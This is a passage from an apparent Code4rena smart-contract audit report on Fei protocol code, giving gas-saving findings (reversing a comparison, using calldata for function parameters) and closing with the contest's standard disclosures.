    if (_incrementFreezeWindow >= _gaugeCycleLength) revert IncrementFreezeError();
    gaugeCycleLength = _gaugeCycleLength;
    incrementFreezeWindow = _incrementFreezeWindow;

A simple comparison can be used for gas savings by reversing the logic:<br>

    if (_incrementFreezeWindow < _gaugeCycleLength) {
    gaugeCycleLength = _gaugeCycleLength;
    incrementFreezeWindow = _incrementFreezeWindow;
    } else {
    revert IncrementFreezeError();
    }

### Recommended Mitigation Steps

Replace the comparison operator and reverse the logic to save gas using the suggestions above.

## \[G-09] Use calldata instead of memory for function parameters

Use calldata instead of memory for function parameters. Having function arguments use calldata instead of memory can save gas.

There are several cases of function arguments using memory instead of calldata:<br>
[ENSReverseRecord.sol#L22](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/utils/ENSReverseRecord.sol#L22)<br>
[ENSReverseRecord.sol#L26](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/utils/ENSReverseRecord.sol#L26)<br>
[FlywheelCore.sol#L210](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L210)<br>

### Recommended Mitigation Steps

Change function arguments from memory to calldata.



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
